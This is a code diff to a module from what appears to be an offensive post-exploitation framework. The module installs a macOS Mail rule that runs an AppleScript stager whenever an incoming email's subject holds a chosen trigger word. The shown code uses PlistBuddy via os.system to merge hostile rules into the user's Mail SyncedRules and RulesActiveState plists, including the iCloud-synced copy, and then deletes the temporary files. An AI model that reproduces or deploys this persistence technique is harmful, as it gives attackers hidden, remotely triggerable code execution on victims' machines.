@@ -14,7 +14,7 @@ class Module:
             'Author': ['@n00py'],
 
             # more verbose multi-line description of the module
-            'Description': ('Installs an mail rule.'),
+            'Description': ('Installs a mail rule that will execute an AppleScript stager when a trigger word is present in the Subject of an incoming mail.'),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -29,7 +29,7 @@ class Module:
             'OpsecSafe' : False,
 
             # list of any references/other comments
-            'Comments': []
+            'Comments': ['https://github.com/n00py/MailPersist']
         }
 
         # any options needed by the module, settable during runtime
@@ -88,7 +88,6 @@ class Module:
 
         ruleName = self.options['RuleName']['Value']
         trigger = self.options['Trigger']['Value']
-        #plistfilename = "%s.plist" % daemonName
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         LittleSnitch = self.options['LittleSnitch']['Value']
@@ -194,10 +193,8 @@ with open(script, 'w+') as f:
     f.close()
 
 if os.path.isfile(home + "/Library/Mobile Documents/com~apple~mail/Data/V3/MailData/ubiquitous_SyncedRules.plist"):
-    #If this exists, this should auto-sync immediately and overwrite any value in SyncedRules.plist
     os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\ Documents/com~apple~mail/Data/V3/MailData/ubiquitous_SyncedRules.plist")
 else:
-    #If it doesn't, here is the main file for rules that will become active on restart
     os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mail/V3/MailData/SyncedRules.plist")
 
 os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/V3/MailData/RulesActiveState.plist")
@@ -206,4 +203,3 @@ os.system("rm " + RulesActiveState)
 
         """ % (AppleScript, SyncedRules, RulesActiveState, plist, plist2, launcher)
         return script
-
